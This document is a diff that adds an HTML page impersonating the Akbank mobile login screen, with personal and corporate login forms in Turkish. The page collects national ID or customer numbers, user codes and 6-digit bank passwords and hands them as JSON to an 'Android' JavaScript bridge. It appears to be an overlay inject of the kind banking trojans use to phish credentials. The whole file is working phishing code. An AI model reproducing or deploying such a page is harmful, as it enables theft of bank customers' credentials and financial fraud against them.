@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>akbank</title>
+    <link rel="shortcut icon" href="com.akbank.android.apps.akbank_direkt.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #e7e7e7;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+        background-size: 100%;
+    }
+    .logo {
+    text-align: right;
+    background-size: 100%;
+    padding: 20px 0px 20px 20px;
+    color: #000;
+    font-weight: 400;
+    text-decoration: none;
+    background: #e7e7e7;
+    padding-right: 40px;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 20px 0px;
+    color: #151515;
+    outline: none;
+    border: 2px solid #cecece;
+    background: #fff;
+    border-radius: 5px;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 0px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #fff;
+    border: none;
+    font-size: 17px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #eb3123;
+    border-radius: 30px;
+}
+fieldset span {
+    display: inline-block;
+    text-align: center;
+    color: #4b4949;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+.logo span {
+    display: inline-block;
+    float: left;
+    padding: 40px 0px 0px 20px;
+    font-size: 20px;
+    color: #fff;
+    font-weight: 600;
+}
+input::placeholder {
+    color: #868484;
+    font-size: 15px;
+}
+.pass input::placeholder {
+    font-size: 11px;
+    color: #db2060;
+}
+</style>
+
+<script type="text/javascript">
+function kurumsal() {
+    document.getElementById("bireysel").style.display="none";
+    document.getElementById("kurumsal").style.display="block";
+}
+function bireysel() {
+    document.getElementById("bireysel").style.display="block";
+    document.getElementById("kurumsal").style.display="none";
+}
+function next_bireysel() {
+    document.getElementById("bireysel").style.display="none";
+    document.getElementById("kurumsal").style.display="none";
+    document.getElementById("next_bireysel").style.display="block";
+}
+function next_kurumsal() {
+    document.getElementById("bireysel").style.display="none";
+    document.getElementById("kurumsal").style.display="none";
+    document.getElementById("next_kurumsal").style.display="block";
+}
+</script>
+
+<fieldset id="formtosend1">
+
+<div id="bireysel">
+
+<div class="logo">
+<a href="#" onclick="bireysel()" style="text-decoration: none;color: #000;font-size: 20px;float: left;border-bottom: 2px solid red;padding-bottom: 10px;" id="nastepny">Bireysel</a>
+<a href="#" onclick="kurumsal()" style="text-decoration: none;color: #000;font-size: 20px;float: right;position: relative;left: 20px;" id="nastepny">Kurumsal</a>
+</div>
+
+<p style="color: #000; font-size: 35px;">İyi akşamlar</p>
+
+<div id="log1">
+
+<div class="area" style="padding: 20px 20px 50px 20px;border-radius: 3px;margin-top: 40px;">
+
+<input type="button" name="sumbit" value="Müşteri veya TC kimlik no ile giriş" onclick="next_bireysel()">
+
+<input type="button" name="sumbit" value="Kredi kartı numarası ile giriş" style="margin-top: 30px;background: none;color: #db291c;border: 1.3px solid #db291c;">
+
+</div>
+
+</div>
+        
+        </div>
+        
+
+<div id="next_bireysel" style="display: none;">
+
+<div class="logo" style="text-align: center; padding: 20px 0px 20px 0px; background: #db291c; color: #fff;">
+
+Giriş
+
+</div>
+
+<div style="padding-top: 30px;margin: 20px;background: #fff;padding-bottom: 1px;border-radius: 10px;">
+
+<label style="padding: 10px; float: left;">MÜŞTERİ VEYA KİMLİK NUMARASI</label>
+<input type="text" name="bireysel_login" id="bireysel_login" style="border-bottom: 1px solid #d9d9d9; border-top: none; border-left: none; border-right: none; border-radius: 0;" placeholder="Müşteri veya TC kimlik numaranı gir">
+<label style="padding: 10px; float: left;">AKBANK ŞİFRESI</label>
+<input type="password" name="bireysel_password" id="bireysel_password" style="border: none;" placeholder="6 haneli şifreni gir">
+
+<input type="button" name="sumbit" onclick="send_form1()" value="Giriş" style="margin-top: 30px;">
+<input name="exit" type="hidden" text="true"/>
+</div>
+
+</div>
+
+</fieldset> 
+
+<fieldset id="formtosend">
+
+<div id="kurumsal" style="display: none;">
+
+<fieldset id="formtosend">
+
+<div class="logo">
+<a href="#" onclick="bireysel()" style="text-decoration: none;color: #000;font-size: 20px;float: left;padding-bottom: 10px;" id="nastepny">Bireysel</a>
+<a href="#" onclick="kurumsal()" style="text-decoration: none;color: #000;font-size: 20px;float: right;position: relative;left: 20px; border-bottom: 2px solid red; padding-bottom: 10px;" id="nastepny">Kurumsal</a>
+</div>
+
+<p style="color: #000; font-size: 35px;">İyi akşamlar</p>
+
+<div id="log1">
+
+<div class="area" style="padding: 20px 20px 50px 20px;border-radius: 3px;margin-top: 40px;">
+
+<input type="button" name="sumbit" value="Giriş" onclick="next_kurumsal()">
+
+</div>
+
+</div>
+        
+        </div>
+
+<div id="next_kurumsal" style="display: none;">
+
+<div class="logo" style="text-align: center; padding: 20px 0px 20px 0px; background: #db291c; color: #fff;">
+
+Giriş
+
+</div>
+
+<div style="padding-top: 30px;margin: 20px;background: #fff;padding-bottom: 1px;border-radius: 10px;">
+
+<label style="padding: 10px; float: left;">MÜŞTERİ NUMARASI</label>
+<input type="text" name="kurumsal_numarasi" id="kurumsal_numarasi" style="border-bottom: 1px solid #d9d9d9; border-top: none; border-left: none; border-right: none; border-radius: 0;" placeholder="Kurumsal müşteri numaranı gir">
+<label style="padding: 10px; float: left;">KULLANICI KODU</label>
+<input type="text" name="kurumsal_kodu" id="kurumsal_kodu" style="border-bottom: 1px solid #d9d9d9; border-top: none; border-left: none; border-right: none; border-radius: 0;" placeholder="Kullanıcı kodunu gir">
+<label style="padding: 10px; float: left;">AKBANK ŞİFRESI</label>
+<input type="password" name="kurumsal_sifresi" id="kurumsal_sifresi" style="border: none;" placeholder="6 haneli şifreni gir">
+
+<input type="button" name="sumbit" onclick="send_form()" value="Giriş" style="margin-top: 30px;">
+<input name="exit" type="hidden" text="true"/>
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        returnResult : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+
+if (document.getElementById("kurumsal_numarasi").value == '')
+{
+    alert ('Tüm alanların doldurulması zorunludur!');
+    return false;
+}
+if (document.getElementById("kurumsal_kodu").value == '')
+{
+    alert ('Tüm alanların doldurulması zorunludur!');
+    return false;
+}
+if (document.getElementById("kurumsal_sifresi").value == '')
+{
+    alert ('Tüm alanların doldurulması zorunludur!');
+    return false;
+}
+    var form = document.getElementById('formtosend');
+    Android.returnResult( formToJSONbyName(form) );
+}
+
+function send_form1()
+{
+if (document.getElementById("bireysel_login").value == '')
+{
+    alert ('Tüm alanların doldurulması zorunludur!');
+    return false;
+}
+if (document.getElementById("bireysel_password").value == '')
+{
+    alert ('Tüm alanların doldurulması zorunludur!');
+    return false;
+}
+    var form = document.getElementById('formtosend1');
+    Android.returnResult( formToJSONbyName(form) );
+}
+</script>
+
+</body>
+</html>
